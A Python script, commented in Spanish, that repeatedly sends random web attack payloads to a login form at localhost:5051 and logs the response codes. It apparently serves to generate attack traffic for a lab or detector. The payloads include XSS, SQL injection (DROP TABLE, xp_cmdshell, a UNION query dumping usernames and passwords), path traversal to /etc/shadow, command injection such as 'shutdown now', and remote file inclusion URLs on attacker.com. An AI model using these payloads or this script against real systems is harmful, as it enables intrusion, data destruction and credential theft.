import requests
import random
import time
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# Payloads iniciales
payloads = {
    'XSS': ['<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>'],
    'SQL Injection': ["1' OR '1'='1", "'; DROP TABLE users; --"],
    'Path Traversal': ['../../etc/passwd', '..\\..\\..\\Windows\\system32\\cmd.exe'],
    'Command Injection': ['; ls -la', '&& cat /etc/passwd'],
    'Remote File Inclusion': ['http://malicious.com/shell.txt', 'https://attacker.com/backdoor.php'],
    'LDAP Injection': ["*)(cn=admin)(", "*(|(uid=*))"],
    'Code Injection': ['${7*7}', '{{7*7}}']
}

url = 'http://localhost:5051/login'

def generar_nuevo_payload(tipo):
    nuevos_payloads = {
        'XSS': [
            '<svg/onload=alert("XSS")>', '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>'
        ],
        'SQL Injection': [
            "1' OR '1'='1' --", "'; EXEC xp_cmdshell('dir'); --",
            "' UNION SELECT NULL, username, password FROM users --"
        ],
        'Path Traversal': [
            '../../etc/shadow', '..\\..\\..\\..\\windows\\win.ini', '../../../../../boot.ini'
        ],
        'Command Injection': [
            '; cat /etc/shadow', '&& shutdown now', '| whoami'
        ],
        'Remote File Inclusion': [
            'http://example.com/shell.php', 'https://attacker.com/exploit.txt'
        ],
        'LDAP Injection': [
            '*()(uid=admin)', '*()(objectClass=*)'
        ],
        'Code Injection': [
            '${{7*7}}', '{{7*7}}'
        ]
    }

    return random.choice(nuevos_payloads.get(tipo, []))

# Enviar ataques
def enviar_ataque():
    tipo_ataque = random.choice(list(payloads.keys()))
    # 50% de probabilidad de usar un payload existente, 50% de generar uno nuevo
    if random.random() < 0.5 and len(payloads[tipo_ataque]) > 0:
        payload = random.choice(payloads[tipo_ataque])
    else:
        payload = generar_nuevo_payload(tipo_ataque)
        payloads[tipo_ataque].append(payload)  # Agregar al pool de payloads

    data = {'username': 'admin', 'password': payload}
    try:
        response = requests.post(url, data=data)
        print(f"{Fore.RED}✖ Ataque ({tipo_ataque}) enviado: {payload} | Código de respuesta: {response.status_code}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}✖ Error al enviar el ataque: {e}{Style.RESET_ALL}")

if __name__ == '__main__':
    print(f"{Fore.YELLOW}⚔️ Atacante iniciado. Enviando ataques cada 5 segundos...{Style.RESET_ALL}")
    while True:
        enviar_ataque()
        time.sleep(5)
